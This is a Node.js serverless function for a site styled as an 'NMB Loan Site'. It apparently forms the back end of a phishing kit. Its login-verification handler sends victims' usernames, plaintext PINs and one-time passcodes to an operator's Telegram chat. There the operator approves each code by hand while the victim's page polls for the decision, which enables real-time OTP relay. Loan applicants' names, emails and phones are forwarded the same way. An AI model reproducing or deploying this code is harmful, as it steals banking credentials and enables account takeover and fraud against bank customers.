/*
 * NMB Loan Site - Telegram Notification API (Vercel serverless function)
 * ------------------------------------------------------------------
 * This is invoked per-request by Vercel. It does NOT run a server or
 * long-poll; instead Telegram sends callback updates to this same
 * endpoint as a webhook.
 *
 * Required environment variables (set in Vercel dashboard, NOT in code):
 *   NMB_BOT_TOKEN  - the Telegram bot token
 *   NMB_CHAT_ID    - the admin chat id
 *
 * One-time: set the webhook, e.g. visit https://<your-domain>/api/setup-webhook
 */
const https = require('https');

// Persistent shared store (survives restarts; shared across serverless instances).
const store = require('../store');

const TOKEN = process.env.NMB_BOT_TOKEN;
const CHAT_ID = process.env.NMB_CHAT_ID;

// State is now persisted via the shared `store` module (see ../store.js),
// so it survives cold starts and is visible to every serverless instance.

function tgApi(method, payload, cb) {
  const data = JSON.stringify(payload);
  const req = https.request(
    {
      hostname: 'api.telegram.org',
      path: `/bot${TOKEN}/${method}`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
    },
    (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(body); } catch (e) { /* ignore */ }
        if (cb) cb(json);
      });
    }
  );
  req.on('error', (e) => { console.error('[telegram]', method, e.message); if (cb) cb(null); });
  req.write(data);
  req.end();
}

function esc(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

async function notifyApplication(app) {
  const id = app.appId || ('APP-' + Date.now());
  const name = app.name || `${app.firstName || ''} ${app.lastName || ''}`.trim() || 'N/A';
  const text =
    `<b>🏦 New Loan Application</b>\n\n` +
    `ID: <code>${esc(id)}</code>\n` +
    `Applicant: ${esc(name)}\n` +
    `Loan Type: ${esc(app.loanType || 'N/A')}\n` +
    `Amount: ${esc(app.amount || 'N/A')} USD\n` +
    `Email: ${esc(app.email || 'N/A')}\n` +
    `Phone: ${esc(app.phone || 'N/A')}\n\n` +
    `Status: <b>⏳ Pending review</b>`;
  tgApi('sendMessage', {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [[
        { text: '✅ Approve', callback_data: `approve:${id}` },
        { text: '❌ Reject', callback_data: `reject:${id}` },
      ]],
    },
  }, (r) => {
    if (r && r.ok) {
      store.set(store.NS.APPS, id, { status: 'pending', messageId: r.result.message_id, chatId: CHAT_ID, details: { ...app, name } });
      console.log('[notify] application', id);
    } else {
      console.error('[notify] application failed:', r && r.description);
    }
  });
  return id;
}

async function notifyLoginVerification(login) {
  const type = login.otp ? 'otp' : 'pin';
  const id = login.loginId || (type === 'otp' ? 'OTP-' : 'LOG-') + Date.now();

  let text = '';
  if (type === 'pin') {
    text =
      `<b>🔐 PIN Verification Required</b>\n\n` +
      `User: ${esc(login.username || 'N/A')}\n` +
      (login.pin ? `PIN: ${esc(login.pin)}\n` : '') +
      (login.amount ? `Amount: ${esc(login.amount)} USD\n` : '') +
      `Time: ${new Date().toLocaleString()}`;
  } else {
    text =
      `<b>🔐 OTP Verification Required</b>\n\n` +
      `User: ${esc(login.username || 'N/A')}\n` +
      (login.pin ? `PIN: ${esc('****')}\n` : '') +
      `OTP: ${esc(login.otp)}\n` +
      `Time: ${new Date().toLocaleString()}`;
  }

  await store.set(store.NS.LOGIN, id, {
    phone: login.username,
    pin: login.pin || '',
    otp: login.otp || '',
    type,
    timestamp: Date.now(),
    status: 'pending',
    decided: false,
    messageId: null,
    chatId: CHAT_ID
  });

  const approveLabel = type === 'pin' ? '✅ Approve PIN' : '✅ Approve OTP';
  const rejectLabel = type === 'pin' ? '❌ Reject PIN' : '❌ Reject OTP';
  const approveData = type === 'pin' ? `pin_approve:${id}` : `otp_approve:${id}`;
  const rejectData = type === 'pin' ? `pin_reject:${id}` : `otp_reject:${id}`;

  tgApi('sendMessage', {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [[
        { text: approveLabel, callback_data: approveData },
        { text: rejectLabel, callback_data: rejectData },
      ]],
    },
  }, (r) => {
    if (r && r.ok) {
      store.get(store.NS.LOGIN, id).then((entry) => {
        if (entry) {
          entry.messageId = r.result.message_id;
          store.set(store.NS.LOGIN, id, entry);
        }
      });
      console.log(`[notify] ${type} verification sent:`, id);
    } else {
      console.error(`[notify] ${type} verification failed:`, r && r.description);
    }
  });
  return id;
}

async function handleCallback(cq) {
  const [action, id] = (cq.data || '').split(':');

  if (action === 'approve' || action === 'reject') {
    const decision = action === 'approve' ? 'approved' : 'rejected';
    const rec = await store.get(store.NS.APPS, id);
    if (rec) rec.status = decision;
    const stamp = action === 'approve' ? '✅ Approved' : '❌ Rejected';
    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Marked ${decision}` });
    if (rec && rec.messageId) {
      const name = rec.details.name || 'N/A';
      tgApi('editMessageText', {
        chat_id: rec.chatId,
        message_id: rec.messageId,
        parse_mode: 'HTML',
        text:
          `<b>🏦 Loan Application</b>\n\n` +
          `ID: <code>${esc(id)}</code>\n` +
          `Applicant: ${esc(name)}\n` +
          `Loan Type: ${esc(rec.details.loanType || 'N/A')}\n` +
          `Amount: ${esc(rec.details.amount || 'N/A')} USD\n\n` +
          `Status: <b>${stamp}</b>`,
      });
      await store.set(store.NS.APPS, id, rec);
    }
    console.log(`[decision] ${id} -> ${decision}`);
    return;
  }

  if (action === 'pin_approve' || action === 'pin_reject' || action === 'otp_approve' || action === 'otp_reject') {
    const decision = (action === 'pin_approve' || action === 'otp_approve') ? 'approved' : 'rejected';
    const kind = action.startsWith('pin') ? 'PIN' : 'OTP';
    const stamp = action.endsWith('approve') ? '✅ Approved' : '❌ Rejected';
    const rec = await store.get(store.NS.LOGIN, id);
    if (rec) {
      rec.status = decision;
      rec.decided = true;
      await store.set(store.NS.LOGIN, id, rec);
    }
    tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
    if (rec && rec.messageId) {
      tgApi('editMessageText', {
        chat_id: rec.chatId,
        message_id: rec.messageId,
        parse_mode: 'HTML',
        text:
          `<b>🔐 ${kind} Verification</b>\n\n` +
          `User: ${esc(rec.phone || 'N/A')}\n` +
          (kind === 'PIN' && rec.pin ? `PIN: ${esc('****')}\n` : '') +
          (kind === 'OTP' && rec.otp ? `OTP: ${esc('******')}\n` : '') +
          `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
          `Status: <b>${stamp}</b>`,
      });
    }
    console.log(`[${kind.toLowerCase()} decision] ${id} -> ${decision}`);
    return;
  }
}

function setWebhook(host, proto, cb) {
  const url = `${proto}://${host}/api`;
  tgApi('setWebhook', { url }, cb);
}

// Vercel serverless entry point
module.exports = async (req, res) => {
  try {
    if (!TOKEN || !CHAT_ID) {
      console.error('Missing NMB_BOT_TOKEN or NMB_CHAT_ID environment variables');
      res.status(500).json({ error: 'Server misconfigured: missing Telegram credentials' });
      return;
    }

    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');

    if (req.method === 'OPTIONS') { res.status(204).end(); return; }

    const url = req.url || '';

    if (req.method === 'GET' && url.includes('setup')) {
      const host = req.headers['x-forwarded-host'] || req.headers.host;
      const proto = req.headers['x-forwarded-proto'] || 'https';
      setWebhook(host, proto, (r) => {
        res.status(200).json({ ok: r && r.ok, description: r && r.description, webhook: `${proto}://${host}/api` });
      });
      return;
    }

    if (req.method === 'GET' && url.startsWith('/api/application/')) {
      const id = url.split('/').pop();
      const rec = await store.get(store.NS.APPS, id);
      res.status(200).json({ status: rec ? rec.status : 'unknown' });
      return;
    }

    if (req.method === 'GET' && url.startsWith('/api/login/status/')) {
      const id = url.split('/').pop();
      const rec = await store.get(store.NS.LOGIN, id);
      res.status(200).json({
        decided: !!rec && !!rec.decided,
        status: rec ? rec.status : 'pending'
      });
      return;
    }

    if (req.method === 'POST') {
      let raw = '';
      req.on('data', (c) => (raw += c));
      req.on('end', async () => {
        let p = {};
        try { p = JSON.parse(raw || '{}'); } catch (e) { /* ignore */ }

        try {
          if (p.callback_query) {
            await handleCallback(p.callback_query);
            res.status(200).json({ ok: true });
            return;
          }
          if (url.includes('application')) {
            const id = await notifyApplication(p);
            res.status(200).json({ ok: true, appId: id });
            return;
          }
          if (url.includes('login')) {
            const id = await notifyLoginVerification(p);
            res.status(200).json({ ok: true, loginId: id });
            return;
          }
          res.status(404).json({ error: 'not found' });
        } catch (e) {
          console.error('[api] request error:', e);
          if (!res.headersSent) res.status(500).json({ error: 'Internal server error' });
        }
      });
      return;
    }

    res.status(200).send('NMB Loan Notification API');
  } catch (e) {
    console.error('[api] unhandled error:', e);
    if (!res.headersSent) res.status(500).json({ error: 'Internal server error' });
  }
};
